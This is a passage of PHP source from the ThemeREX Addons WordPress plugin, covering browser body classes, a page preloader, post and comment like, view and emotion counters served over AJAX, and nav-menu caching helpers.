<?php
/**
 * WordPress utilities
 *
 * @package ThemeREX Addons
 * @since v1.0
 */

// Don't load directly
if ( ! defined( 'TRX_ADDONS_VERSION' ) ) {
	exit;
}



/* Browser-specific classes
------------------------------------------------------------------------------------- */

// Add browser-specific classes to the body tag
if ( ! function_exists('trx_addons_browser_classes') ) {
	// A filter hook is commented, because a classes assign was moved to js
	// ( to compatibility with caching plugins )
	//add_filter( 'body_class', 'trx_addons_browser_classes' );
	function trx_addons_browser_classes( $classes ) {
		// WordPress global vars
		global $is_lynx, $is_gecko, $is_opera, $is_NS4, $is_safari, $is_chrome,
				$is_IE, $is_winIE, $is_macIE, $is_edge,
				$is_iphone,
				$is_apache, $is_nginx, $is_IIS, $is_iis7;
		// Platform
		if ( preg_match("/(iPad|iPhone|iPod)/", $_SERVER['HTTP_USER_AGENT'], $matches) ) {
			if ( ! empty($matches[1]) ) {
				$classes[] = 'ua_ios';
			}
		}
		if ( ! empty($is_iphone) ) {
			$classes[] = 'ua_iphone';
		}
		if ( wp_is_mobile() ) {
			$classes[] = 'ua_mobile';
		}
		// Browser
		if ( preg_match("/[\\s]Firefox\\/([0-9.]*)/", $_SERVER['HTTP_USER_AGENT'], $matches) ) {
			$classes[] = 'ua_firefox';
		}
		if ( ! empty($is_gecko) ) {
			$classes[] = 'ua_gecko';
		}
		if ( ! empty($is_chrome) ) {
			$classes[] = 'ua_chrome';
			if ( preg_match("/[\\s]OPR\\/([0-9.]*)/", $_SERVER['HTTP_USER_AGENT'], $matches) ) {
				if ( ! empty($matches[1]) ) {
					$classes[] = 'ua_opera ua_opera_webkit';
				}
			}
		}
		if ( ! empty($is_safari) ) {
			$classes[] = 'ua_safari';
		}
		if ( ! empty($is_opera) ) {
			$classes[] = 'ua_opera';
		}
		if ( ! empty($is_edge) ) {
			$classes[] = 'ua_edge';
		}
		if ( ! empty($is_IE) ) {
			$classes[] = 'ua_ie';
			if ( ! empty($is_winIE) ) {
				$classes[] = 'ua_ie_win';
			} else if ( ! empty($is_macIE) ) {
				$classes[] = 'ua_ie_mac';
			}
			if ( preg_match("/Trident[^;]*;[\\s]*rv:([0-9.]*)/", $_SERVER['HTTP_USER_AGENT'], $matches)
				||
				preg_match("/MSIE[\\s]*([0-9.]*)/", $_SERVER['HTTP_USER_AGENT'], $matches)
			) {
				if ( ! empty($matches[1]) ) {
					$classes[] = 'ua_ie_' . (int)$matches[1];
					if ( (int)$matches[1] < 11 ) {
						$classes[] = 'ua_ie_lt11';						
					}
				}
			}
		}
		if ( ! empty($is_NS4) ) {
			$classes[] = 'ua_ns4';
		}
		if ( ! empty($is_lynx) ) {
			$classes[] = 'ua_lynx';
		}
		return $classes;
	}
}



/* Page preloader
------------------------------------------------------------------------------------- */

// Add plugin specific classes to the body tag
if ( ! function_exists('trx_addons_body_classes') ) {
	add_filter( 'body_class', 'trx_addons_body_classes' );
	function trx_addons_body_classes( $classes ) {
		if ( ! trx_addons_is_off( trx_addons_get_option('page_preloader') ) ) {
			$classes[] = 'preloader';
		}
		if ( is_front_page() && get_option('show_on_front')=='page' && (int) get_option('page_on_front') > 0 ) {
			$classes[] = 'frontpage';
		}
		return $classes;
	}
}

// Add page preloader into body
if ( ! function_exists('trx_addons_add_page_preloader') ) {
	add_action('trx_addons_action_before_body', 'trx_addons_add_page_preloader', 1);
	add_action('wp_footer', 'trx_addons_add_page_preloader', 1);
	function trx_addons_add_page_preloader() {
		static $loaded = false;
		if ($loaded) return;
		$loaded = true;
		if ( ($preloader=trx_addons_get_option('page_preloader')) != 'none' && ( $preloader != 'custom' || ($image=trx_addons_get_option('page_preloader_image')) != '')) {
			?><div id="page_preloader"><?php
				if ($preloader == 'circle') {
					?><div class="preloader_wrap preloader_<?php echo esc_attr($preloader); ?>"><div class="preloader_circ1"></div><div class="preloader_circ2"></div><div class="preloader_circ3"></div><div class="preloader_circ4"></div></div><?php
				} else if ($preloader == 'square') {
					?><div class="preloader_wrap preloader_<?php echo esc_attr($preloader); ?>"><div class="preloader_square1"></div><div class="preloader_square2"></div></div><?php
				} else if ($preloader == 'dots') {
					?><div class="preloader_wrap preloader_<?php echo esc_attr($preloader); ?>"><div class="preloader_dot" id="preloader_dot_one"></div><div class="preloader_dot" id="preloader_dot_two"></div><div class="preloader_dot" id="preloader_dot_three"></div></div><?php
				} else {
					do_action('trx_addons_action_preloader_wrap', $preloader);
				}
			?></div><?php
		}
	}
}

// Add page preloader styles into head
if ( ! function_exists('trx_addons_add_page_preloader_styles') ) {
	add_action('wp_head', 'trx_addons_add_page_preloader_styles');
	function trx_addons_add_page_preloader_styles() {
		if ( ($preloader=trx_addons_get_option('page_preloader') ) != 'none' ) {
			?>
			<style type="text/css">
			<!--
				#page_preloader {
					<?php
					$bg_color = trx_addons_get_option('page_preloader_bg_color');
					if (!empty($bg_color)) {
						?>background-color: <?php echo esc_attr($bg_color); ?> !important;<?php
					}
					$image = trx_addons_get_option('page_preloader_image');
					if ($preloader=='custom' && !empty($image)) {
						?>background-image: url(<?php echo esc_url($image); ?>);<?php
					}
					?>
				}
			-->
			</style>
			<?php
		}
	}
}



/* Scroll to top button
------------------------------------------------------------------------------------- */

// Add button to the body
if ( ! function_exists('trx_addons_add_scroll_to_top') ) {
	add_action('wp_footer', 'trx_addons_add_scroll_to_top', 9);
	function trx_addons_add_scroll_to_top() {
		if (trx_addons_is_on(trx_addons_get_option('scroll_to_top'))) {
			$type = apply_filters( 'trx_addons_filter_scroll_progress_type', '' );
			trx_addons_show_layout(
				apply_filters(
					'trx_addons_filter_scroll_to_top',
					'<a href="#" class="trx_addons_scroll_to_top trx_addons_icon-up" title="' . esc_attr__('Scroll to top', 'trx_addons') . '">'
						. ( ! empty( $type )
							? '<span class="trx_addons_scroll_progress trx_addons_scroll_progress_type_' . esc_attr( $type ) . '"></span>'
							: ''
							)
					. '</a>'
				)
			);
		}
	}
}



/* Post icon
------------------------------------------------------------------------------------- */

// Return post icon
if ( ! function_exists('trx_addons_get_post_icon') ) {
	function trx_addons_get_post_icon($post_id = 0) {
		if (empty($post_id)) $post_id = get_the_ID();
		$meta = (array)get_post_meta($post_id, 'trx_addons_options', true);
		return !empty($meta['icon']) ? $meta['icon'] : '';
	}
}



/* Post views and likes
-------------------------------------------------------------------------------- */

// Return Post Views number
if ( ! function_exists('trx_addons_get_post_views') ) {
	function trx_addons_get_post_views($id=0){
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$key = 'trx_addons_post_views_count';
			$count = get_post_meta($id, $key, true);
			if ($count===''){
				delete_post_meta($id, $key);
				add_post_meta($id, $key, '0');
				$count = 0;
			}
		} else
			$count = 0;
		return $count;
	}
}

// Set Post Views number
if ( ! function_exists('trx_addons_set_post_views') ) {
	function trx_addons_set_post_views($counter=-1, $id=0) {
		if ( ! $id) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$key = 'trx_addons_post_views_count';
			$count = get_post_meta($id, $key, true);
			if ($count==='') {
				delete_post_meta($id, $key);
				add_post_meta($id, $key, 1);
			} else {
				$count = $counter >= 0 ? $counter : $count+1;
				update_post_meta($id, $key, $count);
			}
		}
	}
}

// Increment Post Views number
if ( ! function_exists('trx_addons_inc_post_views') ) {
	function trx_addons_inc_post_views($inc=0, $id=0) {
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$key = 'trx_addons_post_views_count';
			$count = get_post_meta($id, $key, true);
			if ($count===''){
				$count = max(0, $inc);
				delete_post_meta($id, $key);
				add_post_meta($id, $key, $count);
			} else {
				$count += $inc;
				update_post_meta($id, $key, $count);
			}
		} else {
			$count = 0;
		}
		return $count;
	}
}



// Return Post Likes number
if ( ! function_exists('trx_addons_get_post_likes') ) {
	function trx_addons_get_post_likes($id=0){
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$key = 'trx_addons_post_likes_count';
			$count = get_post_meta($id, $key, true);
			if ($count===''){
				delete_post_meta($id, $key);
				add_post_meta($id, $key, '0');
				$count = 0;
			}
		} else {
			$count = 0;
		}
		return $count;
	}
}

// Set Post Likes number
if ( ! function_exists('trx_addons_set_post_likes') ) {
	function trx_addons_set_post_likes($counter=-1, $id=0) {
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$key = 'trx_addons_post_likes_count';
			$count = get_post_meta($id, $key, true);
			if ($count===''){
				delete_post_meta($id, $key);
				add_post_meta($id, $key, 1);
			} else {
				$count = $counter >= 0 ? $counter : $count+1;
				update_post_meta($id, $key, $count);
			}
		}
	}
}

// Increment Post Likes number
if ( ! function_exists('trx_addons_inc_post_likes') ) {
	function trx_addons_inc_post_likes($inc=0, $id=0) {
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$key = 'trx_addons_post_likes_count';
			$count = get_post_meta($id, $key, true);
			if ($count===''){
				$count = max(0, $inc);
				delete_post_meta($id, $key);
				add_post_meta($id, $key, $count);
			} else {
				$count += $inc;
				update_post_meta($id, $key, max(0, $count));
			}
		} else {
			$count = $inc;
		}
		return $count;
	}
}



// Return Post Emotions
if ( ! function_exists('trx_addons_get_post_emotions') ) {
	function trx_addons_get_post_emotions($id=0){
		$emotions = array();
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$meta = get_post_meta($id, 'trx_addons_post_emotions', true);
			if (is_array($meta)) $emotions = $meta;
		}
		return $emotions;
	}
}

// Set Post Emotions
if ( ! function_exists('trx_addons_set_post_emotions') ) {
	function trx_addons_set_post_emotions($emotions, $id=0) {
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			update_post_meta($id, 'trx_addons_post_emotions', $emotions);
		}
	}
}

// Increment Post Emotions number
if ( ! function_exists('trx_addons_inc_post_emotions') ) {
	function trx_addons_inc_post_emotions($name, $inc=0, $id=0) {
		$emotions = array();
		if ( ! $id ) {
			$id = trx_addons_get_the_ID();
		}
		if ( $id ) {
			$key = 'trx_addons_post_emotions';
			$meta = get_post_meta($id, $key, true);
			if (is_array($meta)) $emotions = $meta;
			$emotions[$name] = (empty($emotions[$name]) ? 0 : $emotions[$name]) + $inc;
			update_post_meta($id, $key, $emotions);
			trx_addons_inc_post_likes($inc, $id);
		}
		return empty($emotions[$name]) ? 0 : $emotions[$name];
	}
}


// Set post likes/views counters when save/publish post
if ( ! function_exists( 'trx_addons_init_post_counters' ) ) {
	add_action('save_post',	'trx_addons_init_post_counters');
	function trx_addons_init_post_counters($id) {
		global $post_type, $post;
		// check autosave
		if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
			return $id;
		}
		// check permissions
		if (empty($post_type) || !is_string($post_type) || !current_user_can('edit_'.$post_type, $id)) {
			return $id;
		}
		if ( !empty($post->ID) && $id==$post->ID ) {
			trx_addons_get_post_views($id);
			trx_addons_get_post_likes($id);
		}
	}
}


// AJAX: Set post likes/views number
if ( ! function_exists( 'trx_addons_callback_post_counter' ) ) {
	add_action('wp_ajax_post_counter', 			'trx_addons_callback_post_counter');
	add_action('wp_ajax_nopriv_post_counter',	'trx_addons_callback_post_counter');
	function trx_addons_callback_post_counter() {
		
		trx_addons_verify_nonce();
	
		$response = array('error'=>'', 'counter' => 0);
		
		$id = (int) $_REQUEST['post_id'];
		if (isset($_REQUEST['likes'])) {
			$response['counter'] = trx_addons_inc_post_likes((int) $_REQUEST['likes'], $id);
		} else if (isset($_REQUEST['views'])) {
			$response['counter'] = trx_addons_inc_post_views((int) $_REQUEST['views'], $id);
		} else if (isset($_REQUEST['emotion_inc']) || isset($_REQUEST['emotion_dec'])) {
			$meta = trx_addons_get_post_emotions($id);
			$emotions = array();
			if (is_array($meta)) {
				foreach ($meta as $k=>$v) {
					if (!empty($k) && !empty($v))
						$emotions[$k] = $v;
				}
			}
			$inc = 0;
			if (!empty($_REQUEST['emotion_dec'])) {
				$inc--;
				$emotions[$_REQUEST['emotion_dec']] = isset($emotions[$_REQUEST['emotion_dec']])
																	? max(0, $emotions[$_REQUEST['emotion_dec']] - 1)
																	: 0;
			}
			if (!empty($_REQUEST['emotion_inc']) && (empty($_REQUEST['emotion_dec']) || $_REQUEST['emotion_inc'] != $_REQUEST['emotion_dec'])) {
				$inc++;
				$emotions[$_REQUEST['emotion_inc']] = isset($emotions[$_REQUEST['emotion_inc']])
																	? $emotions[$_REQUEST['emotion_inc']] + 1
																	: 1;
			}
			$response['counter'] = $emotions;
			trx_addons_set_post_emotions($emotions, $id);
			trx_addons_inc_post_likes($inc, $id);
		}
		trx_addons_ajax_response( $response );
	}
}


// Increment views counter via AJAX
if ( ! function_exists( 'trx_addons_inc_views_ajax' ) ) {
	add_filter("trx_addons_filter_localize_script", 'trx_addons_add_views_vars');
	function trx_addons_add_views_vars($vars) {
		$vars['ajax_views'] = trx_addons_is_on( trx_addons_get_option('ajax_views') ) && apply_filters('trx_addons_filter_inc_views', trx_addons_is_singular());
		return $vars;
	}
}

// Increment views counter via PHP
if ( ! function_exists( 'trx_addons_inc_views_php' ) ) {
	add_action("wp_head", 'trx_addons_inc_views_php');
	function trx_addons_inc_views_php() {
		if ( trx_addons_is_off( trx_addons_get_option('ajax_views') ) 
			&& apply_filters('trx_addons_filter_inc_views', trx_addons_is_singular()) ) {
			trx_addons_inc_post_views(1, get_the_ID());
		}
	}
}


// Return post reactions layout
if ( ! function_exists( 'trx_addons_get_post_reactions' ) ) {
	function trx_addons_get_post_reactions($show=false) {
		if ( trx_addons_is_off( apply_filters( 'trx_addons_filter_emotions_allowed', trx_addons_get_option('emotions_allowed') ) ) ) return '';
		$post_id = get_the_ID();
		$post_emotions = trx_addons_get_post_emotions($post_id);
		$liked = explode(',', trx_addons_get_cookie( 'trx_addons_emotions' ) );
		$active = '';
		foreach ($liked as $v) {
			if (empty($v)) continue;
			$tmp = explode('=', $v);
			if ($tmp[0] == $post_id) {
				$active = $tmp[1];
				break;
			}
		}
		$list = trx_addons_get_option('emotions');
		$output = '';
		if (is_array($list)) {
			$output = '<div id="trx_addons_emotions" class="trx_addons_emotions">'
						. '<h5 class="trx_addons_emotions_title">' . esc_html__("What's your reaction?", 'trx_addons') . '</h5>';
			foreach ($list as $emo) {
				$sn = $emo['name'];
				if (empty($sn)) continue;
				$fn = ! trx_addons_is_url( $sn ) ? str_replace( array( 'icon-', 'trx_addons_icon-' ), '', $sn ) : trx_addons_get_file_name( $sn );
				$slug = $fn;
				$title = $emo['title'];
				if (empty($title))
					$title = $slug;
				else
					$slug = strtolower(sanitize_title($title));
				$style = strpos($sn, '.svg')!==false 
							? 'svg'
							: ( trx_addons_is_url( $sn )
								? 'images'
								: 'icons'
								);
				$output .= '<span class="trx_addons_emotions_item trx_addons_emotions_item_icon_'.esc_attr($fn)
										. ' sc_icon_type_'.esc_attr($style)
										. ($style == 'icons' ? ' '.$sn : '')
										. (!empty($active) && $active==$slug ? ' trx_addons_emotions_active' : '')
										. '"'
								. ' data-slug="'.esc_attr($slug).'"'
								. ' data-postid="'.esc_attr($post_id).'"'
							. '>'
								. ($style == 'svg' ? trx_addons_get_svg_from_file($sn) : '')
								. ($style == 'images' ? '<img src="'.esc_url($sn).'" class="trx_addons_emotions_item_image">' : '')
								. '<span class="trx_addons_emotions_item_number">'
									. (!empty($post_emotions[$slug]) ? esc_html($post_emotions[$slug]) : '0')
								. '</span>'
								. '<span class="trx_addons_emotions_item_label">' . esc_html($title) . '</span>'
							.'</span>';
			}
		}
		$output .= '</div>';
		$output = apply_filters('trx_addons_filter_emotions', $output, $post_emotions, $list, $post_id); 
		if ($show) trx_addons_show_layout($output);
		return $output;
	}
}

// Show reactions in the single posts
if ( ! function_exists( 'trx_addons_show_post_reactions' ) ) {
	add_action( 'trx_addons_action_after_article', 'trx_addons_show_post_reactions', 10, 1);
	function trx_addons_show_post_reactions($slug) {
		if ( trx_addons_is_on( trx_addons_get_option( 'emotions_allowed' ) ) && apply_filters('trx_addons_filter_show_post_reactions', trx_addons_is_single() && ! is_attachment() ) ) {
			trx_addons_get_post_reactions( true );
		}
	}
}

// Add classes with reactions to the <article>
if ( ! function_exists( 'trx_addons_post_class_with_reactions' ) ) {
	add_filter( 'post_class', 'trx_addons_post_class_with_reactions' );
	function trx_addons_post_class_with_reactions($classes) {
		$post_id = get_the_ID();
		$emotions_allowed = trx_addons_is_on(trx_addons_get_option('emotions_allowed'));
		if ($emotions_allowed) {
			$liked = explode(',', trx_addons_get_cookie( 'trx_addons_emotions' ) );
			$active = '';
			foreach ($liked as $v) {
				if (empty($v)) continue;
				$tmp = explode('=', $v);
				if ($tmp[0] == $post_id) {
					$active = $tmp[1];
					break;
				}
			}
			if (!empty($active)) {
				$classes[] = 'post_with_users_like post_with_users_emotion_'.esc_attr($active);
			}
			$post_emotions = trx_addons_get_post_emotions($post_id);
			if (is_array($post_emotions)) {
				arsort($post_emotions);
				$i=0;
				foreach ($post_emotions as $k=>$v) {
					if (empty($k) || empty($v)) continue;
					if ($i++ == 0) $classes[] = 'post_emotion_main_'.esc_attr($k);
					$classes[] = 'post_emotion_'.esc_attr($k);
				}
			}
		} else {
			if ( strpos( trx_addons_get_cookie( 'trx_addons_likes' ), ',' . ( $post_id ) . ',' ) !== false ) {
				$classes[] = 'post_with_users_like';
			}
		}
		return $classes;
	}
}



/* Comment's likes
-------------------------------------------------------------------------------- */

// Return Comment's Likes number
if ( ! function_exists('trx_addons_get_comment_likes') ) {
	function trx_addons_get_comment_likes($id=0){
		if (!$id) $id = get_comment_ID();
		$key = 'trx_addons_comment_likes_count';
		$count = get_comment_meta($id, $key, true);
		if ($count===''){
			delete_comment_meta($id, $key);
			add_comment_meta($id, $key, '0');
			$count = 0;
		}
		return $count;
	}
}

// Set Comment's Likes number
if ( ! function_exists('trx_addons_set_comment_likes') ) {
	function trx_addons_set_comment_likes($id=0, $counter=-1) {
		if (!$id) $id = get_comment_ID();
		$key = 'trx_addons_comment_likes_count';
		$count = get_post_meta($id, $key, true);
		if ($count===''){
			delete_comment_meta($id, $key);
			add_comment_meta($id, $key, 1);
		} else {
			$count = $counter >= 0 ? $counter : $count+1;
			update_comment_meta($id, $key, $count);
		}
	}
}

// Increment Post Likes number
if ( ! function_exists('trx_addons_inc_comment_likes') ) {
	function trx_addons_inc_comment_likes($id=0, $inc=0) {
		if (!$id) $id = get_comment_ID();
		$key = 'trx_addons_comment_likes_count';
		$count = get_comment_meta($id, $key, true);
		if ($count===''){
			$count = max(0, $inc);
			delete_comment_meta($id, $key);
			add_comment_meta($id, $key, $count);
		} else {
			$count += $inc;
			update_comment_meta($id, $key, $count);
		}
		return $count;
	}
}


// Set comment likes counter when save/publish post
if ( ! function_exists( 'trx_addons_init_comment_counters' ) ) {
	add_action('comment_post',	'trx_addons_init_comment_counters', 10, 2);
	function trx_addons_init_comment_counters($id, $status='') {
		if ( !empty($id) ) {
			trx_addons_get_comment_likes($id);
		}
	}
}


// AJAX: Set comment likes number
if ( ! function_exists( 'trx_addons_callback_comment_counter' ) ) {
	add_action('wp_ajax_comment_counter', 		'trx_addons_callback_comment_counter');
	add_action('wp_ajax_nopriv_comment_counter','trx_addons_callback_comment_counter');
	function trx_addons_callback_comment_counter() {
		
		trx_addons_verify_nonce();
	
		$response = array('error'=>'', 'counter' => 0);
		
		$id = (int) $_REQUEST['post_id'];
		if (isset($_REQUEST['likes'])) {
			$response['counter'] = trx_addons_inc_comment_likes($id, (int) $_REQUEST['likes']);
		}
		trx_addons_ajax_response( $response );
	}
}


// Return post likes/views counter layout
if ( ! function_exists( 'trx_addons_get_comment_counters' ) ) {
	function trx_addons_get_comment_counters($counters='likes', $show=false) {
		$comment_id = get_comment_ID();
		$output = '';
		if (strpos($counters, 'likes')!==false) {
			$comment_likes = trx_addons_get_comment_likes($comment_id);
			$likes = trx_addons_get_cookie( 'trx_addons_comment_likes' );
			$allow = strpos( sprintf( ',%s,', $likes ), sprintf(',%d,', $comment_id ) ) === false;
			$output .= '<a href="#" class="comment_counters_item comment_counters_likes trx_addons_icon-heart'.(!empty($allow) ? '-empty enabled' : ' disabled').'"
				title="'.(!empty($allow) ? esc_attr__('Like', 'trx_addons') : esc_attr__('Dislike', 'trx_addons')).'"
				data-commentid="' . esc_attr($comment_id) . '"
				data-likes="' . esc_attr($comment_likes) . '"
				data-title-like="' . esc_attr__('Like', 'trx_addons') . '"
				data-title-dislike="' . esc_attr__('Dislike', 'trx_addons') . '">'
					. '<span class="comment_counters_number">' . trim($comment_likes) . '</span>'
					. '<span class="comment_counters_label">' . esc_html__('Likes', 'trx_addons') . '</span>'
				. '</a>';
		}
		$output = apply_filters( 'trx_addons_filter_get_comment_counters', $output, $counters );
		if ($show) trx_addons_show_layout($output);
		return $output;
	}
}
		



/* Menu utilities
------------------------------------------------------------------------------------- */

// Return nav menu html
if ( ! function_exists( 'trx_addons_get_nav_menu' ) ) {
	function trx_addons_get_nav_menu($location='', $menu='', $depth=0, $custom_walker=false) {
		static $list = array();
		$slug = $location.'_'.$menu;
		if (empty($list[$slug])) {
			$list[$slug] = __('You are trying to use a menu inserted in himself!', 'trx_addons');
			$args = array(
						'menu'				=> empty($menu) || $menu=='default' || trx_addons_is_inherit($menu) ? '' : $menu,
						'container'			=> '',
						'container_class'	=> '',
						'container_id'		=> '',
						'items_wrap'		=> '<ul id="%1$s" class="%2$s">%3$s</ul>',
						'menu_class'		=> 'sc_layouts_menu_nav' . (!empty($location) ? ' '.esc_attr($location).'_nav' : ''),
						'menu_id'			=> ! empty($location) ? $location : trx_addons_generate_id( 'sc_layouts_menu_' ),
						'echo'				=> false,
						'fallback_cb'		=> '',
						'before'			=> '',
						'after'				=> '',
						'link_before'       => trx_addons_get_setting( 'wrap_menu_items_with_span' ) ? '<span>' : '',
						'link_after'        => trx_addons_get_setting( 'wrap_menu_items_with_span' ) ? '</span>' : '',
						'depth'             => $depth
					);
			if (!empty($location)) {
				$args['theme_location'] = $location;
			}
			if ($custom_walker && class_exists('trx_addons_custom_menu_walker')) {
				$args['walker'] = new trx_addons_custom_menu_walker;
			}
			$list[$slug] = wp_nav_menu( apply_filters( 'trx_addons_filter_get_nav_menu_args', $args ) );
		}
		return apply_filters('trx_addons_filter_get_nav_menu', $list[$slug], $location, $menu);
	}
}


// Remove empty spaces between menu items
if ( ! function_exists( 'trx_addons_remove_empty_spaces_between_menu_items' ) ) {
	add_action('wp_nav_menu', 'trx_addons_remove_empty_spaces_between_menu_items', 98, 2);
	function trx_addons_remove_empty_spaces_between_menu_items($html='', $args=array()) {
		return preg_replace(
							array("/>[\r\n\s]*<li/", "/>[\r\n\s]*<\\/ul>/"),
							array("><li", "></ul>"),
							$html
							);
	}
}


// Clear menu from empty items
if ( ! function_exists( 'trx_addons_remove_empty_menu_items' ) ) {
	add_action('wp_nav_menu', 'trx_addons_remove_empty_menu_items', 99, 2);
	function trx_addons_remove_empty_menu_items($html='', $args=array()) {
		return trx_addons_get_setting( 'remove_empty_menu_items' )
					? preg_replace(
							"/<li[^>]*>[\r\n\s]*<a[^>]*>[\r\n\s]*(<span>[\r\n\s]*<\\/span>[\r\n\s]*)?<\\/a>[\r\n\s]*<\\/li>/",
							"",
							$html
							)
					: $html;
	}
}


// Add class 'current-menu-ancestor' for all parents of the 'current-menu-item'
if ( ! function_exists( 'trx_addons_add_current_menu_ancestor' ) ) {
	add_filter( 'wp_nav_menu_objects', 'trx_addons_add_current_menu_ancestor', 10, 2 );
	function trx_addons_add_current_menu_ancestor($items, $args) {
		if ( is_array( $items ) ) {
			$parent = 0;
			foreach ($items as $k => $v) {
				if ( ! empty( $v->current ) ) {
					$parent = ! empty( $v->menu_item_parent ) ? $v->menu_item_parent : 0;
					break;
				}
			}
			$first = true;
			$last_parent = 0;
			while ( (int) $parent > 0 && $last_parent != $parent ) {
				$last_parent = $parent;
				foreach ( $items as $k => $v ) {
					if ( ! empty( $v->db_id ) && $v->db_id == $parent ) {
						$items[ $k ]->current_item_ancestor = true;
						if ( is_array( $v->classes ) && ! in_array( 'current-menu-ancestor', $v->classes ) ) {
							$items[ $k ]->classes[] = 'current-menu-ancestor';
						}
						if ( $first ) {
							$first = false;
							$items[ $k ]->current_item_parent = true;
							if ( is_array( $v->classes ) && ! in_array( 'current-menu-parent', $v->classes ) ) {
								$items[ $k ]->classes[] = 'current-menu-parent';
							}
						}
						$parent = ! empty( $v->menu_item_parent ) ? $v->menu_item_parent : 0;
						break;
					}
				}
			}
		}
		return $items;
	}
}


// Return 'key' for the menu cache
if ( ! function_exists( 'trx_addons_get_menu_cache_key' ) ) {
	function trx_addons_get_menu_cache_key($args) {
		$key = ! empty($args->theme_location)
				? 'location-(' . $args->theme_location . ')'
				: 'menu-(' . ( ! empty($args->menu)
								? ( ! empty($args->menu->slug)
									? $args->menu->slug
									: $args->menu
									)
								: ''
								)
							. ')';
		return str_replace(' ', '', $key);
	}
}


// Add menu to the cache
if ( ! function_exists( 'trx_addons_add_menu_cache' ) ) {
	add_action('wp_nav_menu', 'trx_addons_add_menu_cache', 100, 2);
	function trx_addons_add_menu_cache($html='', $args=array()) {
		if ( apply_filters( 'trx_addons_add_menu_cache', trx_addons_is_on( trx_addons_get_option('menu_cache') ), $args ) ) {
			trx_addons_cache_save( trx_addons_get_menu_cache_key($args), $html, 60 * 60 );
		}
		return $html;
	}
}

// Return menu from the cache
if ( ! function_exists( 'trx_addons_get_menu_cache' ) ) {
	add_action('pre_wp_nav_menu', 'trx_addons_get_menu_cache', 100, 2);
	function trx_addons_get_menu_cache($html, $args) {
		if ( apply_filters( 'trx_addons_get_menu_cache', trx_addons_is_on( trx_addons_get_option('menu_cache') ), $args ) ) {
			$cache = trx_addons_cache_load( trx_addons_get_menu_cache_key($args) );
			if ( ! empty( $cache ) ) {
				$html = apply_filters( 'trx_addons_filter_get_menu_cache_html', $cache, $args );
			}
		}
		return $html;
	}
}

// Prepare menu from cache
if ( ! function_exists( 'trx_addons_get_menu_cache_html' ) ) {
	add_filter( 'trx_addons_filter_get_menu_cache_html', 'trx_addons_get_menu_cache_html', 10, 2 );
	function trx_addons_get_menu_cache_html( $html, $args=array()) {
		// Remove class
		if ( ! empty($args->clear_sc_layouts_classes) ) {
			$html = str_replace('sc_layouts_menu_nav', '', $html);
		}
		// Add to js-list with cached menus
		$menu_id = '';
		$menu_class = '';
		if ( preg_match_all('/<ul[^>]+id=[\'"]([^\'"]+)[\'"]/i', $html, $matches) && !empty($matches[1][0]) ) {
			$menu_id = trim( $matches[1][0] );
		} else if ( ! empty($args->menu_id) ) {
			$menu_id = trim( $args->menu_id );
		} else {
			if ( ! empty($args->menu_class) ) {
				$menu_class = trim( $args->menu_class );
			} else if ( preg_match_all('/<ul[^>]+class=[\'"]([^\'"]+)[\'"]/i', $html, $matches) && !empty($matches[1][0]) ) {
				$menu_class = trim( $matches[1][0] );
			}
			if ( ! empty( $menu_class ) ) {
				$menu_class = join('.', array_map( 'trim', explode( ' ', trim( $matches[1][0] ) ) ) );
			}
		}
		if ( ! empty($menu_id) || ! empty( $menu_class ) ) {
			global $TRX_ADDONS_STORAGE;
			if ( ! isset($TRX_ADDONS_STORAGE['menu_cache']) ) {
				$TRX_ADDONS_STORAGE['menu_cache'] = array();
			}
			$TRX_ADDONS_STORAGE['menu_cache'][] = ! empty($menu_id) ? '#' . esc_attr($menu_id) : '.' . esc_attr($menu_class);
		}
		return $html;
	}
}

// Add cached menu selectors to the js vars
if ( ! function_exists( 'trx_addons_add_menu_cache_to_js' ) ) {
	add_filter('trx_addons_filter_localize_script', 'trx_addons_add_menu_cache_to_js');
	function trx_addons_add_menu_cache_to_js($vars) {
		global $TRX_ADDONS_STORAGE;
		$vars['menu_cache'] = apply_filters('trx_addons_filter_menu_cache', !empty($TRX_ADDONS_STORAGE['menu_cache']) ? $TRX_ADDONS_STORAGE['menu_cache'] : array());
		return $vars;
	}
}

// Clear class 'sc_layouts_menu_nav' from cached menu
if ( ! function_exists( 'trx_addons_widget_nav_menu_args' ) ) {
	add_filter( 'widget_nav_menu_args', 'trx_addons_widget_nav_menu_args', 10, 4 );
	function trx_addons_widget_nav_menu_args($nav_menu_args, $nav_menu, $args, $instance) {
		$nav_menu_args['clear_sc_layouts_classes'] = true;
		return $nav_menu_args;
	}
}

// Clear cache with saved menu
// DEPRECATED in 1.87.0
if ( ! function_exists( 'trx_addons_clear_menu_cache' ) ) {
	add_action('wp_update_nav_menu', 'trx_addons_clear_menu_cache', 10, 2);
	function trx_addons_clear_menu_cache($menu_id=0, $menu_data=array()) {
		delete_transient('trx_addons_menu_'.get_stylesheet());
	}
}


/* Breadcrumbs
------------------------------------------------------------------------------------- */

// Action handler to show breadcrumbs
if ( ! function_exists('trx_addons_action_breadcrumbs') ) {
	add_action( 'trx_addons_action_breadcrumbs', 'trx_addons_action_breadcrumbs', 10, 2);
	function trx_addons_action_breadcrumbs($before='', $after='') {
		if (($fdir = trx_addons_get_file_dir('templates/tpl.breadcrumbs.php')) != '') {
			include $fdir;
		}
	}
}

// Show breadcrumbs path
if ( ! function_exists('trx_addons_get_breadcrumbs') ) {
	function trx_addons_get_breadcrumbs($args=array()) {
		global $wp_query, $post;
		
		$args = array_merge( array(
			'home' => esc_html__('Home', 'trx_addons'),		// Home page title (if empty - not showed)
			'home_link' => '',								// Home page link
			'truncate_title' => 50,					// Truncate all titles to this length (if 0 - no truncate)
			'truncate_add' => '...',				// Append truncated title with this string
			'delimiter' => '<span class="breadcrumbs_delimiter"></span>',		// Delimiter between breadcrumbs items
			'max_levels' => trx_addons_get_option('breadcrumbs_max_level')		// Max categories in the path (0 - unlimited)
			), is_array($args) ? $args : array( 'home' => $args )
		);

